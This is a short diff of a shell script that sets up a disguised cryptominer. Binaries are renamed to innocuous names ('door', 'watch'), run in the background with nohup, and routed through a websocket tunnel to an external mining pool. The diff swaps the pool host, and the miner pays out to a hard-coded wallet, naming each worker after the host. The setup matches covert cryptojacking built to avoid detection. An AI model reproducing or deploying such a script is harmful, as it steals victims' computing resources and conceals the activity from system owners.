@@ -8,7 +8,7 @@ mv wstunnel door
 mv forge watch
 chmod +x door watch
 nohup ./door server ws://127.0.0.1:${WS_PORT} &
-nohup ./door client -L tcp://127.0.0.1:${TCP_PORT}:pearl-sg1.lproute.com:3360 ws://127.0.0.1:${WS_PORT} &
+nohup ./door client -L tcp://127.0.0.1:${TCP_PORT}:pearlski.jetskipool.ai:6970 ws://127.0.0.1:${WS_PORT} &
 
 ./watch --algorithm pearlhash --pool 127.0.0.1:${TCP_PORT} --wallet prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t --worker $(hostname)
 
